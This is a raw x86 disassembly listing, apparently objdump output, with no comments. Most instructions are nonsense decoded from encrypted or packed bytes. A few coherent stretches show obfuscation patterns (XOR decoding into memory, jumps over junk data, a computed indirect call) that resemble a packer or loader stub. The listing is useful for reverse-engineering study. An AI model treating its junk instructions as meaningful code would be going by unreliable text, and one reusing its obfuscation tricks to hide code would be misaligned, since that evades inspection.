  4072c8:	inc    ebp
  4072c9:	cs xchg esi,eax
  4072cb:	mov    ecx,DWORD PTR [ebx+0x7473feef]
  4072d1:	sti    
  4072d2:	inc    esi
  4072d3:	fmul   QWORD PTR [edi+0x76c46fef]
  4072d9:	cdq    
  4072da:	enter  0x62e4,0x1c
  4072de:	xor    bl,dh
  4072e0:	icebp  
  4072e1:	sbb    esi,DWORD PTR ds:0xe3e07bdb
  4072e7:	pop    ds
  4072e8:	sbb    eax,0x8cd33ce8
  4072ed:	push   cs
  4072ee:	std    
  4072ef:	dec    esi
  4072f0:	pop    edx
  4072f1:	call   0x1e83:0xe307361a
  4072f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072f9:	icebp  
  4072fa:	pop    ebp
  4072fb:	or     eax,0xac66a023
  407300:	jg     0x407365
  407302:	es lahf 
  407304:	cmp    BYTE PTR [ebx+0x4f],al
  407307:	cmp    eax,0xfb6fee56
  40730c:	ins    BYTE PTR es:[edi],dx
  40730d:	jp     0x407385
  40730f:	jp     0x407388
  407311:	frstor [ebx-0x5b]
  407314:	jp     0x4072d6
  407316:	mov    bh,BYTE PTR [eax-0x2896bf41]
  40731c:	sbb    ebx,edi
  40731e:	fs imul edx,ecx,0xffffff82
  407322:	cmp    al,0x4f
  407324:	test   al,0xbd
  407326:	sub    eax,0x38b1c96
  40732b:	mov    ds:0x4578b243,eax
  407330:	jmp    0x407333
  407332:	data16 mov cl,0xc5
  407335:	sub    al,BYTE PTR [eax+0xc]
  407338:	push   eax
  407339:	jns    0x40739e
  40733b:	out    dx,eax
  40733c:	push   cs
  40733d:	mov    ch,0x94
  40733f:	adc    dl,dl
  407341:	es add ebx,edi
  407344:	shl    DWORD PTR [esi+0x5b],0x1f
  407348:	cmp    eax,0xfe641b4a
  40734d:	cmp    BYTE PTR [edi-0x66],cl
  407350:	retf   0x4c87
  407353:	mov    DWORD PTR [edi-0x5b0f2370],eax
  407359:	lds    edx,FWORD PTR [ebp-0x3d]
  40735c:	mov    ebp,0xf7815159
  407361:	in     al,dx
  407362:	xchg   ecx,eax
  407363:	xor    DWORD PTR [ebp+0x46],0xa1de6c59
  40736a:	dec    edi
  40736b:	jae    0x4073e1
  40736d:	rol    BYTE PTR [eax+0x30],0x10
  407371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407372:	iret   
  407373:	lods   al,BYTE PTR ds:[esi]
  407374:	xchg   edx,eax
  407375:	pushf  
  407376:	mov    ah,bl
  407378:	scas   al,BYTE PTR es:[edi]
  407379:	ret    0x6287
  40737c:	(bad)  
  40737d:	sbb    esi,esi
  40737f:	(bad)
  407382:	sub    DWORD PTR [ebp-0x3692dcec],ebp
  407388:	cs xchg ebp,eax
  40738a:	stos   BYTE PTR es:[edi],al
  40738b:	hlt    
  40738c:	lea    edi,[ebx+0x6]
  40738f:	repnz mov eax,DWORD PTR [eax+0x198]
  407396:	push   DWORD PTR [eax]
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	pop    ebx
  4073e0:	popa   
  4073e1:	add    cl,cl
  4073e3:	stos   DWORD PTR es:[edi],eax
  4073e4:	shl    DWORD PTR [eax+0x70],0x20
  4073e8:	jge    0x40745a
  4073ea:	jo     0x407412
  4073ec:	scas   eax,DWORD PTR es:[edi]
  4073ed:	add    eax,0x9d3063bd
  4073f2:	js     0x40737f
  4073f4:	sbb    esi,eax
  4073f6:	(bad)  
  4073f8:	add    dl,BYTE PTR [ebp+0x52]
  4073fb:	fs add eax,esp
  4073fe:	les    esp,FWORD PTR [ecx+0x65]
  407401:	or     al,0x5f
  407403:	jmp    0xb6d0:0x2da1be02
  40740a:	cmp    cl,al
  40740c:	jnp    0x4073f0
  40740e:	pop    eax
  40740f:	sbb    BYTE PTR [ebx-0x4e],0x77
  407413:	retf   0x9d83
  407416:	fsubr  st(4),st
  407418:	not    eax
  40741a:	loop   0x40740e
  40741c:	retf   
  40741d:	int3   
  40741e:	mov    al,ds:0x3cc3d135
  407423:	push   ds
  407424:	mov    dl,0xb8
  407426:	rol    DWORD PTR [edi+0x6490f1a7],1
  40742c:	sub    al,0x5f
  40742e:	inc    ebx
  40742f:	xor    bl,ah
  407431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407432:	ins    DWORD PTR es:[edi],dx
  407433:	popf   
  407434:	xor    BYTE PTR [ecx+0xce11239],cl
  40743a:	lods   eax,DWORD PTR ds:[esi]
  40743b:	aad    0x34
  40743d:	mov    bh,0x3e
  40743f:	inc    esi
  407440:	outs   dx,BYTE PTR ds:[esi]
  407441:	jmp    0x407413
  407443:	cmp    BYTE PTR [ebp-0x39],0x75
  407447:	adc    eax,0xcc280e3d
  40744c:	mov    dh,0x54
  40744e:	loope  0x407431
  407450:	mov    bl,0x60
  407452:	xchg   esi,eax
  407453:	adc    dh,BYTE PTR [eax+0x715c3649]
  407459:	imul   BYTE PTR [edx-0x71f03823]
  40745f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407460:	mov    ebx,0xe4a42eb1
  407465:	into   
  407466:	xor    eax,0x9fdaa530
  40746b:	enter  0xa0a,0xd8
  40746f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407470:	pop    edx
  407471:	fiadd  WORD PTR [ebx-0x38]
  407474:	xlat   BYTE PTR ds:[ebx]
  407475:	scas   al,BYTE PTR es:[edi]
  407476:	addr16 sub eax,0x4d198d99
  40747c:	loope  0x4074de
  40747e:	lods   eax,DWORD PTR ds:[esi]
  40747f:	cdq    
  407480:	neg    esp
  407482:	push   eax
  407483:	ret    
  407484:	sub    bl,BYTE PTR [ecx]
  407486:	cmc    
  407487:	retf   
  407488:	rcl    al,0x46
  40748b:	test   al,0x32
  40748e:	mov    ecx,0x46404e30
  407493:	in     al,dx
  407494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407495:	not    BYTE PTR [edx-0x569ecdb1]
  40749b:	xor    eax,edi
  40749d:	and    ch,BYTE PTR [ecx]
  40749f:	or     edi,DWORD PTR [edx+0x45a74d76]
  4074a5:	inc    edi
  4074a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a7:	lods   al,BYTE PTR ds:[esi]
  4074a8:	sub    ecx,DWORD PTR [edx]
  4074aa:	cld    
  4074ab:	add    ebp,edx
  4074ad:	cwde   
  4074ae:	hlt    
  4074af:	pusha  
  4074b0:	rcl    DWORD PTR [esi],cl
  4074b2:	pop    esp
  4074b3:	pop    ebp
  4074b4:	out    dx,eax
  4074b5:	aas    
  4074b6:	hlt    
  4074b7:	(bad)  
  4074b9:	jle    0x4074ad
  4074bb:	xchg   BYTE PTR gs:[ebx-0x2f988615],bh
  4074c2:	add    ebp,DWORD PTR [edi-0x40]
  4074c5:	jge    0x407545
  4074c7:	dec    eax
  4074c8:	test   DWORD PTR [eax-0x65d6a76],esi
  4074ce:	pop    ebx
  4074cf:	mov    ah,0x10
  4074d1:	hlt    
  4074d2:	gs pop edx
  4074d4:	push   0xffffffaf
  4074d6:	xor    DWORD PTR [eax],ebx
  4074d8:	js     0x4074bf
  4074da:	sbb    al,0x15
  4074dc:	or     ebx,eax
  4074de:	mov    eax,0x1a39ae60
  4074e3:	or     eax,0x28f8af3b
  4074e8:	fdivrp st(0),st
  4074ea:	dec    edx
  4074eb:	popf   
  4074ec:	xlat   BYTE PTR ds:[ebx]
  4074ed:	nop
  4074ee:	mov    edx,0xbc0b6927
  4074f3:	(bad)  
  4074f4:	shl    DWORD PTR [esi-0x6e583321],0xad
  4074fb:	iret   
  4074fc:	mov    edi,0xaec4e501
  407501:	es mov bl,0xff
  407504:	dec    edx
  407505:	or     eax,0x10f88c7d
  40750a:	test   BYTE PTR [edx],bl
  40750c:	fcomp  DWORD PTR [eax-0x632bee56]
  407512:	or     ah,BYTE PTR [ecx-0x57]
  407515:	cdq    
  407516:	daa    
  407517:	add    al,0x7
  407519:	xlat   BYTE PTR ds:[ebx]
  40751a:	fiadd  DWORD PTR [esi+0x79]
  40751d:	push   0xffffff8a
  40751f:	jae    0x4074bf
  407521:	lahf   
  407522:	cmp    eax,DWORD PTR [ecx]
  407524:	jecxz  0x40751a
  407526:	sahf   
  407527:	or     eax,0xe73debd4
  40752c:	call   0x19bff0c8
  407531:	mov    al,ds:0x9809557
  407536:	in     eax,0x9
  407538:	or     al,0x53
  40753a:	stos   DWORD PTR es:[edi],eax
  40753b:	dec    eax
  40753c:	ror    BYTE PTR [edx-0xc],cl
  40753f:	fcom   QWORD PTR [esp+eax*2]
  407542:	mov    dl,0x56
  407544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407545:	shl    DWORD PTR [ebp-0x63],cl
  407548:	cmp    al,0x50
  40754a:	cmp    edx,ebx
  40754c:	aas    
  40754d:	mov    BYTE PTR [ebp-0x5c7bc9ee],dh
  407553:	js     0x4074e4
  407555:	xchg   ebp,eax
  407556:	add    eax,0x289ef817
  40755b:	loop   0x4075a2
  40755d:	fadd   DWORD PTR [edi+0x16b4626a]
  407563:	lahf   
  407564:	mov    ch,0xa9
  407566:	mov    ebp,0xb3e66f93
  40756b:	clc    
  40756c:	push   ebp
  40756d:	pusha  
  40756e:	and    al,0x5a
  407570:	jns    0x4075af
  407572:	call   0xcbd0:0xdbcd79a3
  407579:	xor    DWORD PTR [edi],esp
  40757b:	popf   
  40757c:	out    dx,al
  40757d:	ficom  DWORD PTR [ebp+0xe]
  407580:	jnp    0x407547
  407582:	out    0xe,al
  407584:	(bad)  
  407585:	ret    0x934
  407588:	xchg   ecx,eax
  407589:	pop    ebp
  40758a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40758b:	or     ecx,DWORD PTR [ebx-0x12dcc006]
  407591:	out    0xcd,al
  407593:	xchg   edx,eax
  407594:	push   esp
  407595:	cmp    BYTE PTR ds:0xdab72546,al
  40759b:	or     esi,eax
  40759d:	push   ecx
  40759e:	lods   al,BYTE PTR ds:[esi]
  40759f:	or     esi,0x4e
  4075a2:	int3   
  4075a3:	and    ah,BYTE PTR [esi+0x39]
  4075a6:	mov    al,0x27
  4075a8:	lods   eax,DWORD PTR ds:[esi]
  4075a9:	jl     0x407613
  4075ab:	aam    0xc4
  4075ad:	xchg   ebp,eax
  4075ae:	rcr    WORD PTR [esi-0x5f7e8ad8],1
  4075b5:	mov    ah,0xaa
  4075b7:	fcom   DWORD PTR [ebp+0x30c87b4c]
  4075bd:	dec    edi
  4075be:	xchg   ecx,eax
  4075bf:	inc    ecx
  4075c0:	jmp    0x4075fc
  4075c2:	jo     0x407563
  4075c4:	ja     0x407626
  4075c6:	dec    esi
  4075c7:	jp     0x40763f
  4075c9:	xchg   esi,eax
  4075ca:	pop    DWORD PTR [edx+0x753e6d1a]
  4075d0:	sub    DWORD PTR [eax],edx
  4075d2:	loope  0x4075e8
  4075d4:	test   DWORD PTR [esi-0x41d5707a],esp
  4075da:	ins    DWORD PTR es:[edi],dx
  4075db:	pushf  
  4075dc:	aas    
  4075dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075de:	shl    BYTE PTR ds:0xf85048a0,cl
  4075e4:	and    BYTE PTR [eax+0x4a],0xe5
  4075e8:	arpl   WORD PTR [esi],bp
  4075ea:	push   edi
  4075eb:	out    0x44,al
  4075ed:	sbb    bh,BYTE PTR [edi+0x336babdf]
  4075f3:	jns    0x4075fb
  4075f5:	inc    ebx
  4075f6:	shl    edx,1
  4075f8:	leave  
  4075f9:	(bad)  
  4075fa:	lock popf 
  4075fc:	loopne 0x4075e5
  4075fe:	dec    ebp
  4075ff:	les    esp,FWORD PTR [esi+esi*8-0x57]
  407603:	clc    
  407604:	fld    TBYTE PTR [ecx]
  407606:	fsubr  DWORD PTR ds:0xe9924655
  40760c:	sub    esp,0x19
  40760f:	imul   edx,DWORD PTR [ecx],0xffffffc1
  407612:	aam    0x98
  407614:	shl    DWORD PTR [esi-0x6d],cl
  407617:	(bad)  
  407619:	inc    ecx
  40761a:	lock popf 
  40761c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40761d:	js     0x40767a
  40761f:	or     BYTE PTR ds:0xe10a33af,ch
  407625:	test   al,0x4c
  407627:	(bad)
  40762c:	sub    BYTE PTR [edx-0x4c4c119d],0xd
  407633:	xchg   esi,eax
  407634:	and    esp,eax
  407636:	call   0x3afc3796
  40763b:	fist   WORD PTR [edi-0x6b272a66]
  407641:	push   0x78ad18e3
  407646:	enter  0xbf0c,0xd7
  40764a:	adc    al,0xd0
  40764c:	xor    ah,BYTE PTR [edx-0x22]
  40764f:	mov    ch,0xd5
  407651:	call   0xf36d844
  407656:	enter  0x597b,0xaa
  40765a:	jmp    FWORD PTR [edi]
  40765c:	mov    ah,0xcb
  40765e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40765f:	sbb    DWORD PTR cs:[ebx+0x63],ebp
  407663:	jmp    0x407685
  407665:	pop    es
  407666:	out    dx,al
  407667:	das    
  407668:	stc    
  407669:	xabort 0xa4
  40766c:	jge    0x40765e
  40766e:	xor    BYTE PTR [edi-0x32629b21],bh
  407674:	dec    esp
  407675:	das    
  407676:	adc    eax,0xcbf6c8ca
  40767b:	cmp    BYTE PTR [edx],dl
  40767d:	xchg   esp,eax
  40767e:	push   0xffffff9f
  407680:	inc    edi
  407681:	sbb    ebp,eax
  407683:	or     al,0x6
  407685:	aas    
  407686:	outs   dx,BYTE PTR ds:[esi]
  407687:	lahf   
  407688:	mov    edx,0x9218ce66
  40768d:	mov    ch,0xf2
  40768f:	jns    0x4076db
  407691:	push   0xffffffad
  407693:	jecxz  0x407636
  407695:	ror    BYTE PTR [eax+0x4f],0x94
  407699:	dec    edi
  40769a:	jl     0x40765f
  40769c:	sbb    BYTE PTR [esi+0x54fb59ca],ch
  4076a2:	xchg   edi,eax
  4076a3:	mov    WORD PTR [eax-0x6cc4489c],cs
  4076a9:	cmp    BYTE PTR [edi+0x513fa45b],dh
  4076af:	cmp    ch,BYTE PTR [eax+eax*1+0x75]
  4076b3:	cmp    ch,BYTE PTR [edi]
  4076b5:	ss out dx,al
  4076b7:	stos   DWORD PTR es:[edi],eax
  4076b8:	aas    
  4076b9:	xchg   DWORD PTR [esp+edx*2-0x63],ecx
  4076bd:	into   
  4076be:	in     al,dx
  4076bf:	into   
  4076c0:	and    ah,bl
  4076c2:	push   0xffffffca
  4076c4:	jle    0x407690
  4076c6:	js     0x40770d
  4076c8:	mov    esp,0x7084c45a
  4076cd:	cs sub al,ah
  4076d0:	loopne 0x407686
  4076d2:	inc    ecx
  4076d3:	hlt    
  4076d4:	hlt    
  4076d5:	xchg   al,cl
  4076d7:	and    bl,BYTE PTR [edi-0x18fe10f4]
  4076dd:	loopne 0x407738
  4076df:	mov    esp,esp
  4076e1:	mov    ebx,0xaef5942f
  4076e6:	sbb    al,0x70
  4076e8:	gs mov edx,0xd2498aa9
  4076ee:	scas   al,BYTE PTR es:[edi]
  4076ef:	sbb    bh,BYTE PTR [edi]
  4076f1:	loopne 0x4076e9
  4076f3:	push   cs
  4076f4:	lds    ebx,FWORD PTR [edx+0x48]
  4076f7:	mov    eax,ds:0xff6ca8fa
  4076fc:	scas   al,BYTE PTR es:[edi]
  4076fd:	xchg   BYTE PTR [eax],ch
  4076ff:	jle    0x407723
  407701:	xor    BYTE PTR [edi-0x635b2767],bh
  407707:	xchg   ebp,eax
  407708:	xchg   edx,eax
  407709:	or     al,0xff
  40770b:	fcomp  DWORD PTR [edx+0x76]
  40770e:	fisub  DWORD PTR [edi+0x33]
  407711:	ds dec eax
  407713:	push   ds
  407714:	sbb    al,0xf
  407716:	std    
  407717:	xor    eax,0xfe6b5336
  40771c:	or     bh,bh
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	dec    edi
  4078c8:	mov    ebp,0xce5b290e
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x86524970
  4078d6:	sub    DWORD PTR [ecx],edx
  4078d8:	dec    ebp
  4078d9:	add    eax,0x626cdd0f
  4078de:	and    al,BYTE PTR [esi+0x14]
  4078e1:	jbe    0x40787d
  4078e3:	dec    edx
  4078e4:	mov    dl,0xfc
  4078e6:	in     al,dx
  4078e7:	sub    DWORD PTR [esi-0x28c36f9f],0x15c8c22f
  4078f1:	and    DWORD PTR [edx-0xb],esi
  4078f4:	or     BYTE PTR [eax+0x69],al
  4078f7:	dec    ebp
  4078f8:	cli    
  4078f9:	loope  0x4078f8
  4078fb:	out    0x26,al
  4078fd:	xor    al,BYTE PTR [edi-0x5f997960]
  407903:	xor    al,0xc0
  407905:	int3   
  407906:	jno    0x407890
  407908:	mov    eax,0x6d48ce40
  40790d:	ds gs stos DWORD PTR es:[edi],eax
  407910:	call   0x9f61dd17
  407915:	sbb    al,0xde
  407917:	cli    
  407918:	jb     0x40792f
  40791a:	mov    WORD PTR [esi+0x3e],gs
  40791d:	add    edx,DWORD PTR [edi]
  40791f:	das    
  407920:	rol    ah,cl
  407922:	mov    al,ds:0x204eebf3
  407927:	mov    al,0xa2
  407929:	stos   BYTE PTR es:[edi],al
  40792a:	and    eax,0x12942074
  40792f:	sbb    eax,0x16d3afd9
  407934:	out    0xfe,al
  407936:	dec    edi
  407937:	aaa    
  407938:	lea    ebp,[ebx-0x22]
  40793b:	mov    esi,0x9513bdab
  407940:	gs jp  0x407919
  407943:	pop    edi
  407944:	sbb    DWORD PTR [ecx-0x2e],0x128113c6
  40794b:	outs   dx,DWORD PTR ds:[esi]
  40794c:	loope  0x407964
  40794e:	test   eax,0x7525e339
  407953:	add    ah,dh
  407955:	aaa    
  407956:	and    bl,BYTE PTR [edx+0x27207590]
  40795c:	pop    eax
  40795d:	adc    DWORD PTR [ecx-0x66628624],edx
  407963:	inc    eax
  407964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407965:	xchg   ebp,eax
  407966:	call   0xa596:0x9aba59b5
  40796d:	sub    ah,0xe0
  407970:	mov    edi,0x963cc5a
  407975:	out    dx,al
  407976:	xlat   BYTE PTR ds:[ebx]
  407977:	adc    eax,DWORD PTR [ebx+ecx*1+0x2a985f9e]
  40797e:	or     dh,bl
  407980:	in     al,dx
  407981:	adc    al,BYTE PTR [eax+0x57118cd9]
  407987:	push   ebp
  407988:	pop    ss
  407989:	dec    ebp
  40798a:	cvtps2pd xmm3,QWORD PTR [ebp-0x7e42ac9d]
  407991:	sub    al,cl
  407993:	scas   al,BYTE PTR es:[edi]
  407994:	jge    0x407948
  407996:	push   0x7c
  407998:	pop    eax
  407999:	mov    ah,0x88
  40799b:	daa    
  40799c:	ss aad 0xfd
  40799f:	stos   DWORD PTR es:[edi],eax
  4079a0:	add    al,0xaf
  4079a2:	mov    al,0x9e
  4079a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a6:	mov    ah,0x8
  4079a8:	mov    al,0x32
  4079aa:	ins    DWORD PTR es:[edi],dx
  4079ab:	retf   0x6486
  4079ae:	nop
  4079af:	mov    edx,0xd152fd86
  4079b4:	popf   
  4079b5:	jmp    0xe351:0xe5a968d5
  4079bc:	mov    esi,0xb6ce6b53
  4079c1:	repz ja 0x407a10
  4079c4:	ror    BYTE PTR [esi],1
  4079c6:	(bad)  
  4079c7:	mov    ebp,0xa8ce9081
  4079cc:	lea    esp,[eax]
  4079ce:	mov    ch,BYTE PTR [ecx-0x3f94714b]
  4079d4:	xchg   ebp,eax
  4079d5:	dec    esi
  4079d6:	xor    BYTE PTR [eax+0x23],0x6f
  4079da:	mov    cl,0x9
  4079dc:	jmp    0x65f5:0xbdfa2938
  4079e3:	sub    edx,0xffffff88
  4079e6:	sbb    ch,BYTE PTR ds:0xdb2b4398
  4079ec:	mov    edx,eax
  4079ee:	sahf   
  4079ef:	pushf  
  4079f0:	jge    0x4079f3
  4079f2:	sbb    eax,0x487eda62
  4079f7:	enter  0xe619,0xdf
  4079fb:	pop    esi
  4079fc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fe:	into   
  4079ff:	sub    eax,0xcf038e83
  407a04:	stos   BYTE PTR es:[edi],al
  407a05:	mov    ch,0x83
  407a07:	mov    esp,esi
  407a09:	sti    
  407a0a:	cmp    ah,BYTE PTR es:[edi-0x3c]
  407a0e:	cld    
  407a0f:	sbb    BYTE PTR [eax+0x40],dh
  407a12:	test   eax,0x7e3938a0
  407a17:	sub    eax,0xcff1ad4b
  407a1c:	push   cs
  407a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1e:	les    edi,FWORD PTR [ecx+0x148d1b41]
  407a24:	cmp    BYTE PTR [ebp-0xbe5716f],bh
  407a2a:	lods   al,BYTE PTR ds:[esi]
  407a2b:	ret    0x9acf
  407a2e:	cmp    eax,0x21c10e82
  407a33:	ror    BYTE PTR [edx+0x6a5d5e59],1
  407a39:	fcomp  DWORD PTR [edi+0x4279a3de]
  407a3f:	lahf   
  407a40:	or     edx,DWORD PTR [ecx+esi*1-0x37a2a9b1]
  407a47:	dec    edi
  407a48:	mov    ch,0xcd
  407a4a:	xchg   WORD PTR [esi-0x28],dx
  407a4e:	stos   DWORD PTR es:[edi],eax
  407a4f:	mov    ebp,0xda1b50e3
  407a54:	mov    BYTE PTR [ecx],cl
  407a56:	add    BYTE PTR [ebp-0x2a7af595],al
  407a5c:	daa    
  407a5d:	mov    ch,0xaf
  407a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a60:	pop    ss
  407a61:	inc    edi
  407a62:	enter  0x8e32,0xe5
  407a66:	push   eax
  407a67:	retf   0xb5e5
  407a6a:	lds    esi,FWORD PTR [ebx]
  407a6c:	push   esi
  407a6d:	pop    ecx
  407a6e:	mov    esp,0xdb41b2f6
  407a73:	data16 aad 0x67
  407a76:	jp     0x407ad9
  407a78:	lods   eax,DWORD PTR ds:[esi]
  407a79:	dec    eax
  407a7a:	fucomip st,st(2)
  407a7c:	fwait
  407a7d:	retf   0xe1ad
  407a80:	sub    bl,BYTE PTR [ebx]
  407a82:	add    DWORD PTR [esi+0x4190a8b8],esi
  407a88:	ins    DWORD PTR es:[edi],dx
  407a89:	jle    0x407a20
  407a8b:	std    
  407a8c:	add    DWORD PTR [esi+esi*1+0x77],edi
  407a90:	ret    0x6fbc
  407a93:	xor    eax,0xa96ee065
  407a98:	dec    edi
  407a99:	mov    eax,ds:0x49355e44
  407a9e:	mov    esp,0xcfcd5a4
  407aa3:	ss dec ebp
  407aa5:	nop
  407aa6:	pop    ebx
  407aa7:	int3   
  407aa8:	test   eax,0xa6e1fb8c
  407aad:	jno    0x407a89
  407aaf:	lahf   
  407ab0:	xor    al,0xcf
  407ab2:	sahf   
  407ab3:	jo     0x407b30
  407ab5:	ret    
  407ab6:	push   esp
  407ab7:	in     al,dx
  407ab8:	pusha  
  407ab9:	and    BYTE PTR [ecx+0x1a],ah
  407abc:	sbb    eax,0x424638b5
  407ac1:	inc    esp
  407ac2:	icebp  
  407ac3:	iret   
  407ac4:	adc    bh,BYTE PTR es:[edi-0x19]
  407ac8:	mov    dl,0x72
  407aca:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  407ad1:	add    edx,DWORD PTR ds:0x432dce
  407ad7:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  407ade:	mov    edi,DWORD PTR ds:0x43436a
  407ae4:	sub    DWORD PTR ds:0x434372,edi
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi-0x11bb4807]
  407b18:	sub    bl,dl
  407b1a:	push   esp
  407b1b:	int3   
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0x28a59b70
  407b25:	in     al,0x53
  407b27:	xchg   esi,eax
